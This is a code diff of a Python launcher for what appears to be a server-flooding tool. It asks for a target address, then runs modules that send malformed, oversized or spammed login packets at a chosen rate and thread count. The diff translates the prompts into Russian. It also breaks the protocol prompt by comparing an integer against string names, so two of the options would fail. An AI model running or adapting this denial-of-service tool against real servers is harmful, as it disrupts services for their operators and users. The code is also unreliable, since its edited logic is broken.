@@ -10,9 +10,9 @@ def title(text):os.system("cls");print(((os.get_terminal_size().columns//2-len(t
 
 
 
-title("--- IP Address ---")
+title("--- Айпи Адрес ---")
 
-ip = input("IP: ")
+ip = input("Айпи: ")
 
 if ip.rfind(":") == -1:
 	address = ip
@@ -25,43 +25,45 @@ else:
 
 
 
-title("--- Module ---")
+title("--- Способ ---")
 
-modules = ["malformed_packet",
-		   "null_ping",
-		   "big_handshake",
-		   "double_login",
-		   "login_spam"]
+modules = ["отправляет искаженные пакеты",
+		   "отправляет чуть сломанные пакеты",
+		   "отправляет огромные пакеты",
+		   "спамит авторизацией",
+		   "спамит двойной авторизацией"]
 
 n = 1
 for i in modules:
 	print(f"{n}. {i}")
 	n += 1
-print("Run help.py for more\n")
+print("")
 
-module = modules[int(input("Module (1-5): "))-1]
-
-
-
-title("--- Parameters ---")
-
-time = int(input("Time: "))
-threads = int(input("Threads: "))
-pps = int(input("Packets Per Seconds: "))
-protocol = input("Protocol: ")
+module = int(input("Способ (1-5): "))-1
 
 
 
 
-title("--- Running ---")
+title("--- Другие параметры ---")
 
-if module == "malformed_packet":
+time = int(input("Время в секундах: "))
+threads = int(input("Потоки: "))
+pps = int(input("Пакетов в секунду: "))
+if module in ["login_spam","double_login"]:
+	protocol = input("Протокол: ")
+
+
+
+
+title("--- Запуск ---")
+
+if module == 0:
     malformed_packet.MalformedPacket(time,threads,address,port,pps)
-elif module == "null_ping":
+elif module == 1:
     null_ping.NullPing(time,threads,address,port,pps)
-elif module == "big_handshake":
+elif module == 2:
     big_handshake.BigHandshake(time,threads,address,port,pps)
-elif module == "login_spam":
+elif module == 3:
 	login_spam.LoginSpam(time,threads,address,port,pps,protocol)
-elif module == "double_login":
+elif module == 4:
     double_login.DoubleLogin(time,threads,address,port,pps,protocol)
